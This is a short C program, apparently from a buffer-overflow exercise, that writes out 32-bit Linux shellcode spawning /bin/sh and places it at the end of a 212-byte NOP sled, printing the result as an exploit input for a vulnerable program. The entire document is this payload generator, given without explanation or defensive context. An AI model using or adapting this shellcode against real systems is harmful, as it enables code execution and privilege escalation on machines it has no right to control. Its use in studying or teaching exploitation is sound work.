#include <stdlib.h>
#include <string.h>
#include <stdio.h>

int main()
{
    char payload [] = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
    char buffer[212];

    memset(&buffer, 0x90, 212);
    memcpy(buffer + sizeof(buffer) - sizeof(payload), payload, sizeof(payload));
    printf("%s\n", buffer);

}